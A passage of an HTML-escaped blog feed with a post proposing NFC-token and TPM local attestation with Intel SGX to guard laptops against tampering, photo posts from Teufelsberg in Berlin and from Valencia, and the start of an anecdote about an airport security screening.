&lt;li&gt;System Management Mode (&lt;span class="caps"&gt;SMM&lt;/span&gt;),&amp;nbsp;and,&lt;/li&gt;
&lt;li&gt;(possibly) Intel Active Management Technology (&lt;span class="caps"&gt;AMT&lt;/span&gt;) — modulo Intel&amp;#8217;s &lt;span class="caps"&gt;SGX&lt;/span&gt;
implementation (and how much you trust said implementation to protect you from
their &lt;span class="caps"&gt;AMT&lt;/span&gt;&amp;nbsp;backdoor).&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;This protects against tampering of the &lt;span class="caps"&gt;BIOS&lt;/span&gt; itself, which, otherwise, could
possibly subvert the initialisation of the &lt;span class="caps"&gt;TPM&lt;/span&gt; hardware and cause the
integrity verification checks to falsely pass.  Without &lt;span class="caps"&gt;SGX&lt;/span&gt;, &lt;span class="caps"&gt;SMM&lt;/span&gt; (ring &amp;#8220;-2&amp;#8221;)
would have the capability to emulate and/or forward calls to and from the &lt;span class="caps"&gt;TPM&lt;/span&gt;
device, and as such any &lt;span class="caps"&gt;SMM&lt;/span&gt;-based attack would completely subvert the local&amp;nbsp;attestation.&lt;/p&gt;
&lt;p&gt;Additionally, in my and Matthew&amp;#8217;s &lt;span class="caps"&gt;NFC&lt;/span&gt;-&lt;span class="caps"&gt;TPM&lt;/span&gt;-based local attestation method, the
cryptographic code for verification would need to be partially executed on the
&amp;#8220;smart&amp;#8221; device.  In
&lt;a href="https://media.ccc.de/v/32c3-7343-beyond_anti_evil_maid"&gt;Matthew&amp;#8217;s 32c3 talk&lt;/a&gt;,
the laptop uses a pre-shared key, stored in the &lt;span class="caps"&gt;TPM&lt;/span&gt;, to generate …&lt;/p&gt;</summary><content type="html">

&lt;p&gt;Previously, &lt;a href="https://twitter.com/mjg59"&gt;Matthew Garrett&lt;/a&gt; and I came up with an
new idea for a method of local attestation.  Local attestation here means:
&lt;em&gt;authenticating the computer that the user possesses a valid hardware token&lt;/em&gt;
and &lt;em&gt;authenticating to the user that the computer is executing the intended
code, and that said code has not been tampered with.&lt;/em&gt; The idea is to use some
&lt;span class="caps"&gt;NFC&lt;/span&gt;-enabled &amp;#8220;smart&amp;#8221; wearable device, something trivially hideable on (or
&lt;em&gt;inside&lt;/em&gt;¹) one&amp;#8217;s person in order to authenticate to the &lt;span class="caps"&gt;TPM&lt;/span&gt;, which then
validates that the next stage of code to be executed, e.g. usually the kernel
(ring 0) or the hypervisor (ring &amp;#8220;-1&amp;#8221;), has verifiable integrity.  Matthew has
&lt;a href="https://media.ccc.de/v/32c3-7343-beyond_anti_evil_maid"&gt;a great 32c3 talk&lt;/a&gt; on
&lt;span class="caps"&gt;TPM&lt;/span&gt;-based local attestation, and even breifly, towards the end of the video,
mentions the &lt;span class="caps"&gt;NFC&lt;/span&gt;&amp;nbsp;ideas.&lt;/p&gt;
&lt;p&gt;As an example use case, this would allow journalists² greater safety when
crossing borders.  Your laptop got taken away by the &lt;span class="caps"&gt;TLA&lt;/span&gt; at a border?  Not
such a problem; it simply doesn&amp;#8217;t boot without you present.  The &lt;span class="caps"&gt;TLA&lt;/span&gt; took your
laptop into the back room to try to install some malware on it?  No worries,
because your laptop will refuse to boot the next time you try to do so (or it
could signal in some other way that the system was compromised… however,
refusing to decrypt the user&amp;#8217;s harddrive is probably a bare minimum safety
requirement, and refusing to boot at all is probably the&amp;nbsp;safest).&lt;/p&gt;
&lt;p&gt;However, all of this places a great deal of trust in both the &lt;span class="caps"&gt;TPM&lt;/span&gt; device and
its&amp;nbsp;manufacturer…&lt;/p&gt;


&lt;p&gt;Despite &lt;a href="https://twitter.com/rootkovska"&gt;Joanna&lt;/a&gt; Rutkowska&amp;#8217;s
&lt;a href="http://theinvisiblethings.blogspot.ru/2013/08/thoughts-on-intels-upcoming-software.html"&gt;concerns over untrusted user input/output&lt;/a&gt;,
it would be interesting to see a system, built upon the above local
attestation method, which uses an
&lt;a href="https://software.intel.com/en-us/blogs/2013/09/26/protecting-application-secrets-with-intel-sgx"&gt;Intel &lt;span class="caps"&gt;SGX&lt;/span&gt; enclave&lt;/a&gt;
(see the
&lt;a href="https://software.intel.com/sites/default/files/managed/07/b7/319433-023.pdf#page=36"&gt;Intel Instruction Set Extensions Programming Reference&lt;/a&gt;
for architectural details) to execute code whose integrity has been previously
verified through two-factor authenticated &lt;span class="caps"&gt;TPM&lt;/span&gt; local attestation.  This doesn&amp;#8217;t
require user I/O, and it doesn&amp;#8217;t require anything to be displayed to the user.
What it would provide, however, is a way for the code whose integrity is
verified by the &lt;span class="caps"&gt;TPM&lt;/span&gt; to remain safely isolated&amp;nbsp;from:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;the &lt;span class="caps"&gt;BIOS&lt;/span&gt;, or tampering&amp;nbsp;thereof,&lt;/li&gt;
&lt;li&gt;System Management Mode (&lt;span class="caps"&gt;SMM&lt;/span&gt;),&amp;nbsp;and,&lt;/li&gt;
&lt;li&gt;(possibly) Intel Active Management Technology (&lt;span class="caps"&gt;AMT&lt;/span&gt;) — modulo Intel&amp;#8217;s &lt;span class="caps"&gt;SGX&lt;/span&gt;
implementation (and how much you trust said implementation to protect you from
their &lt;span class="caps"&gt;AMT&lt;/span&gt;&amp;nbsp;backdoor).&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;This protects against tampering of the &lt;span class="caps"&gt;BIOS&lt;/span&gt; itself, which, otherwise, could
possibly subvert the initialisation of the &lt;span class="caps"&gt;TPM&lt;/span&gt; hardware and cause the
integrity verification checks to falsely pass.  Without &lt;span class="caps"&gt;SGX&lt;/span&gt;, &lt;span class="caps"&gt;SMM&lt;/span&gt; (ring &amp;#8220;-2&amp;#8221;)
would have the capability to emulate and/or forward calls to and from the &lt;span class="caps"&gt;TPM&lt;/span&gt;
device, and as such any &lt;span class="caps"&gt;SMM&lt;/span&gt;-based attack would completely subvert the local&amp;nbsp;attestation.&lt;/p&gt;
&lt;p&gt;Additionally, in my and Matthew&amp;#8217;s &lt;span class="caps"&gt;NFC&lt;/span&gt;-&lt;span class="caps"&gt;TPM&lt;/span&gt;-based local attestation method, the
cryptographic code for verification would need to be partially executed on the
&amp;#8220;smart&amp;#8221; device.  In
&lt;a href="https://media.ccc.de/v/32c3-7343-beyond_anti_evil_maid"&gt;Matthew&amp;#8217;s 32c3 talk&lt;/a&gt;,
the laptop uses a pre-shared key, stored in the &lt;span class="caps"&gt;TPM&lt;/span&gt;, to generate a
&lt;a href="https://tools.ietf.org/html/rfc6238"&gt;Time-based One-Time Password (&lt;span class="caps"&gt;TOTP&lt;/span&gt;)&lt;/a&gt;,
which is very simple scheme used for two-factor authentication, and which
essentially&amp;nbsp;does:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="err"&gt;TOTP ← HMAC(SharedKey||TimeInterval)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;&lt;/p&gt;

&lt;p&gt;The output then is presented as a QRcode on the screen, which the user scans
into the external device (a smart phone, in this case) which also runs &lt;span class="caps"&gt;TOTP&lt;/span&gt; to
check that the &lt;span class="caps"&gt;TPM&lt;/span&gt; verification was&amp;nbsp;successful.&lt;/p&gt;
&lt;p&gt;Smart phones being security nightmares, it&amp;#8217;s nice in my opinion to avoid them
altogether.  (And certainly to never rely on them in any trusted computing
scheme!)  Alternatively, one could also imagine some smart² jewelry³ such as a
necklace or bracelet (cufflinks could also be pretty badass) with an embedded
&lt;span class="caps"&gt;NFC&lt;/span&gt;-capable smartcard.  Unfortunately, smartcard means you&amp;#8217;re likely running
in a &lt;span class="caps"&gt;JVM&lt;/span&gt;… which — my livid hatred for the Java programming language aside —
hasn&amp;#8217;t exactly had the best track record in terms of security.  This also
unfortunately
&lt;a href="http://trousers.sourceforge.net/pkcs11.html"&gt;probably restricts&lt;/a&gt; us to using
only the set of cryptographic primitives which are &lt;span class="caps"&gt;PKCS&lt;/span&gt;#11 compatible, in
order to facilitate communication between the smartcard and the &lt;span class="caps"&gt;TSS&lt;/span&gt;.  One
interesting area for further research would be a way to remove this
requirement, i.e. use something other than a smartcard, and/or devise a scheme
for moving execution (on either side) into an &lt;span class="caps"&gt;SGX&lt;/span&gt; enclave as&amp;nbsp;well.&lt;/p&gt;
&lt;p&gt;Moving forward towards more secure computing platforms, the most realistic
candidate I can currently imagine would be comprised by a
&lt;a href="|filename|/../replacing-a-thinkpad-x60-bootflash-chip.html"&gt;hardware-modified Thinkpad&lt;/a&gt;
which uses the above local attestation scheme to verify the integrity of
&lt;a href="https://www.qubes-os.org/doc/security-critical-code/"&gt;QubesOS&amp;#8217;s security-critical code&lt;/a&gt;
and the integrity of a &lt;a href="https://www.coreboot.org/"&gt;Coreboot&lt;/a&gt; (the latter of
which could also be verified from within QubesOS, e.g. via
&lt;a href="https://www.qubes-os.org/doc/anti-evil-maid/"&gt;Joanna&amp;#8217;s Anti-Evil Maid system&lt;/a&gt;,
however only &lt;em&gt;post boot&lt;/em&gt; and unsure if this would be capatible with using some
the extra protections against malicious &lt;span class="caps"&gt;SMM&lt;/span&gt; code, like verifying the RAMstage
upon wake from S3, which Coreboot can provide).  Providing these integrity
checks pass, and the user possesses a valid hardware-authentication token,
Coreboot can then be executed (without needed to trust &lt;span class="caps"&gt;SMM&lt;/span&gt;) and further
initialise Qube&amp;#8217;s Xen hypervisor, which then executes dom0 and so&amp;nbsp;on.&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;&lt;p style="font-size:80%;"&gt;
¹ Matthew&amp;#8217;s rather grotesque aside was, &lt;em&gt;&amp;#8220;Well… you want to limit the number of
parts they have to cut off of you…&amp;#8221;&lt;/em&gt;&lt;br/&gt;
² Well… &lt;em&gt;anyone&lt;/em&gt; actually.  But everyone likes to pretend journos are
special and the rest of us are second-class citizens, right? &lt;br/&gt;
³ Yes, I hate that word too.  Shut up and mark your bingo card already. &lt;br/&gt;
⁴ I&amp;#8217;d just like to take this opportunity to coin the term &lt;em&gt;SmartSchmuck&lt;/em&gt;.
&lt;/p&gt;&lt;/p&gt;</content><category term="hacking"></category><category term="coreboot"></category><category term="hardware"></category><category term="security"></category><category term="tpm"></category><category term="hypervisor"></category><category term="qubes"></category></entry><entry><title>Teufelsberg</title><link href="https://blog.patternsinthevoid.net/teufelsberg.html" rel="alternate"></link><published>2015-10-31T16:29:00+00:00</published><updated>2015-11-06T02:35:07+00:00</updated><author><name>isis agora lovecruft</name></author><id>tag:blog.patternsinthevoid.net,2015-10-31:/teufelsberg.html</id><content type="html">&lt;p&gt;&lt;a href="http://dasalte.ccc.de/teufelsberg/"&gt;Teufelsberg&lt;/a&gt; — &lt;em&gt;Devil&amp;#8217;s Mountain&lt;/em&gt; in
English — is a derelict &lt;span class="caps"&gt;NSA&lt;/span&gt; listening post from the Cold War era on the
outskirts of Berlin.  Abandoned in the 1990s, the geodesic radio towers once
abused for surveillance, now serve a much better use for street artists and
&lt;a href="https://de.wikipedia.org/wiki/Wir_sind_die_Nacht"&gt;German vampire films&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;&lt;/p&gt;&lt;span style="align:left; float:left; width:100%;"&gt;
  &lt;table style="float:left; clear:left; width:100%; margin: 1px;"&gt;
    &lt;tbody&gt;
      &lt;tr&gt;
        &lt;td style="text-align:center; padding: 1px;"&gt;
          &lt;a href="./static/images/2015/09/berlin-teufelsberg-processed-small/2015-09-27-P9270046_small.png"&gt;
            &lt;img alt="" style="width: 700px;"
                 src="./static/images/2015/09/berlin-teufelsberg-processed-small/2015-09-27-P9270046_small.png" /&gt;
          &lt;/a&gt;
        &lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
        &lt;td style="text-align:center; padding: 1px;"&gt;
          &lt;a href="./static/images/2015/09/berlin-teufelsberg-processed-small/2015-09-27-P9270047_small.png"&gt;
            &lt;img alt="" style="width: 700px;"
                 src="./static/images/2015/09/berlin-teufelsberg-processed-small/2015-09-27-P9270047_small.png" /&gt;
          &lt;/a&gt;
        &lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
        &lt;td style="text-align:center; padding: 1px;"&gt;
          &lt;a href="./static/images/2015/09/berlin-teufelsberg-processed-small/2015-09-27-P9270057_small.png"&gt;
            &lt;img alt="" style="width: 700px;"
                 src="./static/images/2015/09/berlin-teufelsberg-processed-small/2015-09-27-P9270057_small.png" /&gt;
          &lt;/a&gt;
        &lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
        &lt;td style="text-align:center; padding: 1px;"&gt;
          &lt;a href="./static/images/2015/09/berlin-teufelsberg-processed-small/2015-09-27-P9270059_small.png"&gt;
            &lt;img alt="" style="width: 700px;"
                 src="./static/images/2015/09/berlin-teufelsberg-processed-small/2015-09-27-P9270059_small.png" /&gt;
          &lt;/a&gt;
        &lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
        &lt;td style="text-align:center; padding: 1px;"&gt;
          &lt;a href="./static/images/2015/09/berlin-teufelsberg-processed-small/2015-09-27-P9270070_small.png"&gt;
            &lt;img alt="" style="width: 700px;"
                 src="./static/images/2015/09/berlin-teufelsberg-processed-small/2015-09-27-P9270070_small.png" /&gt;
          &lt;/a&gt;
        &lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
        &lt;td style="text-align:center; padding: 1px;"&gt;
          &lt;a href="./static/images/2015/09/berlin-teufelsberg-processed-small/2015-09-27-P9270071_small.png"&gt;
            &lt;img alt="" style="width: 700px;"
                 src="./static/images/2015/09/berlin-teufelsberg-processed-small/2015-09-27-P9270071_small.png" /&gt;
          &lt;/a&gt;
        &lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
        &lt;td style="text-align:center; padding: 1px;"&gt;
          &lt;a href="./static/images/2015/09/berlin-teufelsberg-processed-small/2015-09-27-P9270077_small.png"&gt;
            &lt;img alt="" style="width: 700px;"
                 src="./static/images/2015/09/berlin-teufelsberg-processed-small/2015-09-27-P9270077_small.png" /&gt;
          &lt;/a&gt;
        &lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
        &lt;td style="text-align:center; padding: 1px;"&gt;
          &lt;a href="./static/images/2015/09/berlin-teufelsberg-processed-small/2015-09-27-P9270081_small.png"&gt;
            &lt;img alt="" style="width: 700px;"
                 src="./static/images/2015/09/berlin-teufelsberg-processed-small/2015-09-27-P9270081_small.png" /&gt;
          &lt;/a&gt;
        &lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
        &lt;td style="text-align:center; padding: 1px;"&gt;
          &lt;a href="./static/images/2015/09/berlin-teufelsberg-processed-small/2015-09-27-P9270083_small.png"&gt;
            &lt;img alt="" style="width: 700px;"
                 src="./static/images/2015/09/berlin-teufelsberg-processed-small/2015-09-27-P9270083_small.png" /&gt;
          &lt;/a&gt;
        &lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
        &lt;td style="text-align:center; padding: 1px;"&gt;
          &lt;a href="./static/images/2015/09/berlin-teufelsberg-processed-small/2015-09-27-P9270085_small.png"&gt;
            &lt;img alt="" style="width: 700px;"
                 src="./static/images/2015/09/berlin-teufelsberg-processed-small/2015-09-27-P9270085_small.png" /&gt;
          &lt;/a&gt;
        &lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
        &lt;td style="text-align:center; padding: 1px;"&gt;
          &lt;a href="./static/images/2015/09/berlin-teufelsberg-processed-small/2015-09-27-P9270109_small.png"&gt;
            &lt;img alt="" style="width: 700px;"
                 src="./static/images/2015/09/berlin-teufelsberg-processed-small/2015-09-27-P9270109_small.png" /&gt;
          &lt;/a&gt;
        &lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
        &lt;td style="text-align:center; padding: 1px;"&gt;
          &lt;a href="./static/images/2015/09/berlin-teufelsberg-processed-small/2015-09-27-P9270089-P9270108_blended_fused_small.png"&gt;
            &lt;img alt="" style="width: 700px;"
                 src="./static/images/2015/09/berlin-teufelsberg-processed-small/2015-09-27-P9270089-P9270108_blended_fused_small.png" /&gt;
          &lt;/a&gt;
        &lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
        &lt;td style="text-align:center; padding: 1px;"&gt;
          &lt;a href="./static/images/2015/09/berlin-teufelsberg-processed-small/2015-09-27-P9270111_small.png"&gt;
            &lt;img alt="" style="width: 700px;"
                 src="./static/images/2015/09/berlin-teufelsberg-processed-small/2015-09-27-P9270111_small.png" /&gt;
          &lt;/a&gt;
        &lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
        &lt;td style="text-align:center; padding: 1px;"&gt;
          &lt;a href="./static/images/2015/09/berlin-teufelsberg-processed-small/2015-09-27-P9270117_small.png"&gt;
            &lt;img alt="" style="width: 700px;"
                 src="./static/images/2015/09/berlin-teufelsberg-processed-small/2015-09-27-P9270117_small.png" /&gt;
          &lt;/a&gt;
        &lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
        &lt;td style="text-align:center; padding: 1px;"&gt;
          &lt;a href="./static/images/2015/09/berlin-teufelsberg-processed-small/2015-09-27-P9270118_small.png"&gt;
            &lt;img alt="" style="width: 700px;"
                 src="./static/images/2015/09/berlin-teufelsberg-processed-small/2015-09-27-P9270118_small.png" /&gt;
          &lt;/a&gt;
        &lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
        &lt;td style="text-align:center; padding: 1px;"&gt;
          &lt;a href="./static/images/2015/09/berlin-teufelsberg-processed-small/2015-09-27-P9270127_small.png"&gt;
            &lt;img alt="" style="width: 700px;"
                 src="./static/images/2015/09/berlin-teufelsberg-processed-small/2015-09-27-P9270127_small.png" /&gt;
          &lt;/a&gt;
        &lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
        &lt;td style="text-align:center; padding: 1px;"&gt;
          &lt;a href="./static/images/2015/09/berlin-teufelsberg-processed-small/2015-09-27-P9270129_small.png"&gt;
            &lt;img alt="" style="width: 700px;"
                 src="./static/images/2015/09/berlin-teufelsberg-processed-small/2015-09-27-P9270129_small.png" /&gt;
          &lt;/a&gt;
        &lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
        &lt;td style="text-align:center; padding: 1px;"&gt;
          &lt;a href="./static/images/2015/09/berlin-teufelsberg-processed-small/2015-09-27-P9270130_small.png"&gt;
            &lt;img alt="" style="width: 700px;"
                 src="./static/images/2015/09/berlin-teufelsberg-processed-small/2015-09-27-P9270130_small.png" /&gt;
          &lt;/a&gt;
        &lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
        &lt;td style="text-align:center; padding: 1px;"&gt;
          &lt;a href="./static/images/2015/09/berlin-teufelsberg-processed-small/2015-09-27-P9270138_small.png"&gt;
            &lt;img alt="" style="width: 700px;"
                 src="./static/images/2015/09/berlin-teufelsberg-processed-small/2015-09-27-P9270138_small.png" /&gt;
          &lt;/a&gt;
        &lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
        &lt;td style="text-align:center; padding: 1px;"&gt;
          &lt;a href="./static/images/2015/09/berlin-teufelsberg-processed-small/2015-09-27-P9270141_small.png"&gt;
            &lt;img alt="" style="width: 700px;"
                 src="./static/images/2015/09/berlin-teufelsberg-processed-small/2015-09-27-P9270141_small.png" /&gt;
          &lt;/a&gt;
        &lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
        &lt;td style="text-align:center; padding: 1px;"&gt;
          &lt;a href="./static/images/2015/09/berlin-teufelsberg-processed-small/2015-09-27-P9270149_small.png"&gt;
            &lt;img alt="" style="width: 700px;"
                 src="./static/images/2015/09/berlin-teufelsberg-processed-small/2015-09-27-P9270149_small.png" /&gt;
          &lt;/a&gt;
        &lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
        &lt;td style="text-align:center; padding: 1px;"&gt;
          &lt;a href="./static/images/2015/09/berlin-teufelsberg-processed-small/2015-09-27-P9270151_small.png"&gt;
            &lt;img alt="" style="width: 700px;"
                 src="./static/images/2015/09/berlin-teufelsberg-processed-small/2015-09-27-P9270151_small.png" /&gt;
          &lt;/a&gt;
        &lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
        &lt;td style="text-align:center; padding: 1px;"&gt;
          &lt;a href="./static/images/2015/09/berlin-teufelsberg-processed-small/2015-09-27-P9270153_small.png"&gt;
            &lt;img alt="" style="width: 700px;"
                 src="./static/images/2015/09/berlin-teufelsberg-processed-small/2015-09-27-P9270153_small.png" /&gt;
          &lt;/a&gt;
        &lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
        &lt;td style="text-align:center; padding: 1px;"&gt;
          &lt;a href="./static/images/2015/09/berlin-teufelsberg-processed-small/2015-09-27-P9270155_small.png"&gt;
            &lt;img alt="" style="width: 700px;"
                 src="./static/images/2015/09/berlin-teufelsberg-processed-small/2015-09-27-P9270155_small.png" /&gt;
          &lt;/a&gt;
        &lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
        &lt;td style="text-align:center; padding: 1px;"&gt;
          &lt;a href="./static/images/2015/09/berlin-teufelsberg-processed-small/2015-09-27-P9270156_small.png"&gt;
            &lt;img alt="" style="width: 700px;"
                 src="./static/images/2015/09/berlin-teufelsberg-processed-small/2015-09-27-P9270156_small.png" /&gt;
          &lt;/a&gt;
        &lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
        &lt;td style="text-align:center; padding: 1px;"&gt;
          &lt;a href="./static/images/2015/09/berlin-teufelsberg-processed-small/2015-09-27-P9270163_small.png"&gt;
            &lt;img alt="" style="width: 700px;"
                 src="./static/images/2015/09/berlin-teufelsberg-processed-small/2015-09-27-P9270163_small.png" /&gt;
          &lt;/a&gt;
        &lt;/td&gt;
      &lt;/tr&gt;
    &lt;/tbody&gt;
  &lt;/table&gt;
&lt;/span&gt;
&lt;/p&gt;&lt;br /&gt;&lt;p&gt;&lt;/p&gt;</content><category term="travel"></category><category term="photography"></category><category term="berlin"></category><category term="nsa"></category></entry><entry><title>Valencia, Spain</title><link href="https://blog.patternsinthevoid.net/valencia-spain.html" rel="alternate"></link><published>2015-03-19T15:29:00+00:00</published><updated>2015-11-03T15:45:26+00:00</updated><author><name>isis agora lovecruft</name></author><id>tag:blog.patternsinthevoid.net,2015-03-19:/valencia-spain.html</id><content type="html">

&lt;p style="color: #FFFFFF"&gt;

This is some text to get the table of images to appear only after the jump.
Hackity hack.
This is some text to get the table of images to appear only after the jump.
Hackity hack.
This is some text to get the table of images to appear only after the jump.
Hackity hack.
This is some text to get the table of images to appear only after the jump.
Hackity hack.
This is some text to get the table of images to appear only after the jump.
Hackity&amp;nbsp;hack.

&lt;/p&gt;



&lt;p&gt;&lt;/p&gt;&lt;span style="align:left; float:left; width:100%;"&gt;
  &lt;table style="float:left; clear:left; width:85%; padding:0.2em;"&gt;
    &lt;tbody&gt;
      &lt;tr&gt;
        &lt;td style="text-align:center; padding:0.2em;"&gt;
          &lt;a href="./static/images/2015/03/valencia/2015-03-19-P3030014.png"&gt;
            &lt;img alt="" width="700px"
                 src="./static/images/2015/03/valencia/2015-03-19-P3030014.png" /&gt;
          &lt;/a&gt;
        &lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
        &lt;td style="text-align:center; padding:0.2em;"&gt;
          &lt;a href="./static/images/2015/03/valencia/2015-03-19-P3030031.png"&gt;
            &lt;img alt="" width="700px"
                 src="./static/images/2015/03/valencia/2015-03-19-P3030031.png" /&gt;
          &lt;/a&gt;
        &lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
        &lt;td style="text-align:center; padding:0.2em;"&gt;
          &lt;a href="./static/images/2015/03/valencia/2015-03-19-P3030025.png"&gt;
            &lt;img alt="If H.R. Giger and Steve Jobs had a baby…" width="700px"
                 src="./static/images/2015/03/valencia/2015-03-19-P3030025.png" /&gt;
          &lt;/a&gt;
        &lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
        &lt;td style="text-align:center; padding:0.2em;"&gt;
          &lt;a href="./static/images/2015/03/valencia/2015-03-19-P3030007.png"&gt;
            &lt;img alt="When all your friends wear mirrored shades, anonymity is a bitch." width="700px"
                 src="./static/images/2015/03/valencia/2015-03-19-P3030007.png" /&gt;
          &lt;/a&gt;
        &lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
        &lt;td style="text-align:center; padding:0.2em;"&gt;
          &lt;a href="./static/images/2015/03/valencia/2015-03-19-P3030026.png"&gt;
            &lt;img alt="" width="700px"
                 src="./static/images/2015/03/valencia/2015-03-19-P3030026.png" /&gt;
          &lt;/a&gt;
        &lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
        &lt;td style="text-align:center; padding:0.2em;"&gt;
          &lt;a href="./static/images/2015/03/valencia/2015-03-19-P3030058.png"&gt;
            &lt;img alt="" width="700px"
                 src="./static/images/2015/03/valencia/2015-03-19-P3030058.png" /&gt;
          &lt;/a&gt;
        &lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
        &lt;td style="text-align:center; padding:0.2em;"&gt;
          &lt;a href="./static/images/2015/03/valencia/2015-03-19-P3050157.png"&gt;
            &lt;img alt="" width="700px"
                 src="./static/images/2015/03/valencia/2015-03-19-P3050157.png" /&gt;
          &lt;/a&gt;
        &lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
        &lt;td style="text-align:center; padding:0.2em;"&gt;
          &lt;a href="./static/images/2015/03/valencia/2015-03-19-P3050164.png"&gt;
            &lt;img alt="" width="700px"
                 src="./static/images/2015/03/valencia/2015-03-19-P3050164.png" /&gt;
          &lt;/a&gt;
        &lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
        &lt;td style="text-align:center; padding:0.2em;"&gt;
          &lt;a href="./static/images/2015/03/valencia/2015-03-19-P3050167.png"&gt;
            &lt;img alt="" width="700px"
                 src="./static/images/2015/03/valencia/2015-03-19-P3050167.png" /&gt;
          &lt;/a&gt;
        &lt;/td&gt;
      &lt;/tr&gt;
    &lt;/tbody&gt;
  &lt;/table&gt;
&lt;/span&gt;
&lt;/p&gt;&lt;br /&gt;&lt;/p&gt;</content><category term="travel"></category><category term="photography"></category><category term="travel"></category><category term="architecture"></category><category term="spain"></category></entry><entry><title>Rogue Waves</title><link href="https://blog.patternsinthevoid.net/rogue-waves.html" rel="alternate"></link><published>2014-09-16T06:34:00+00:00</published><updated>2014-09-20T22:03:12+00:00</updated><author><name>isis agora lovecruft</name></author><id>tag:blog.patternsinthevoid.net,2014-09-16:/rogue-waves.html</id><summary type="html">&lt;p&gt;The &lt;span class="caps"&gt;TSA&lt;/span&gt; agent had just finished running their fingers through my hair, and
begun to pat down my shoulders and outstretched&amp;nbsp;arms.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;span class="dquo"&gt;&amp;#8220;&lt;/span&gt;So&amp;#8230; do you live in Washington D.C.?&amp;#8221; they&amp;nbsp;asked.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;I shook my head, no. They asked what I was doing in the capitol. I responded,
in my politest, most innocent, most mousy-little-girl&amp;nbsp;voice:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;span class="dquo"&gt;&amp;#8220;&lt;/span&gt;I&amp;#8217;m just going to talk to some of our nation&amp;#8217;s senators about my&amp;nbsp;work.&amp;#8221;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;The &lt;span class="caps"&gt;TSA&lt;/span&gt; agent jumped back a&amp;nbsp;bit.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;span class="dquo"&gt;&amp;#8220;&lt;/span&gt;Oh? What do you&amp;nbsp;do?&amp;#8221;&lt;/p&gt;
&lt;p&gt;&lt;span class="dquo"&gt;&amp;#8220;&lt;/span&gt;I&amp;#8217;m a programmer and computer security&amp;nbsp;researcher.&amp;#8221;&lt;/p&gt;
&lt;p&gt;&lt;span class="dquo"&gt;&amp;#8220;&lt;/span&gt;Oh! Are you like really smart? I saw things about this on &lt;span class="caps"&gt;TV&lt;/span&gt;. Do you like
break code and&amp;nbsp;stuff?&amp;#8221;&lt;/p&gt;
&lt;p&gt;&lt;span class="dquo"&gt;&amp;#8220;&lt;/span&gt;Perhaps, sometimes. But, you know&amp;#8230; I can&amp;#8217;t really talk about&amp;nbsp;it.&amp;#8221;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;I forced my face into what I hoped was a kind and knowing&amp;nbsp;half-smile.&lt;/p&gt;
&lt;p&gt;They seemed utterly&amp;nbsp;shocked.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;span class="dquo"&gt;&amp;#8220;&lt;/span&gt;Well then, good luck with your talks, miss, and you&amp;#8217;re free to&amp;nbsp;go.&amp;#8221;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;they said, forgetting to pat down the remainder of me, swab the baby blue
latex gloves, and put the swab into the machine that purportedly checks for
chemical compounds used in&amp;nbsp;explosives.&lt;/p&gt;
&lt;p&gt;I coolly walked away, holding my nose up in the air, as if I believed I had
every right in the world to not be humiliatingly groped, holding all my
snickering giddiness inside until I got around the corner of a head-high
dividing wall. Then I shook my head, shocked at myself and feeling somewhat
bad and for the multiple lies² that had just fallen out of my mouth before I
could even think about them, and I laughed out loud, wondering how long it
would take for that person to realise they still hadn&amp;#8217;t checked their&amp;nbsp;gloves.&lt;/p&gt;
&lt;p style="text-align: center; font-weight: bold;"&gt;&amp;middot &amp;middot&amp;nbsp;&amp;middot&lt;/p&gt;

&lt;p&gt;That evening, arriving at the hotel in Washington &lt;span class="caps"&gt;D.C.&lt;/span&gt; for the
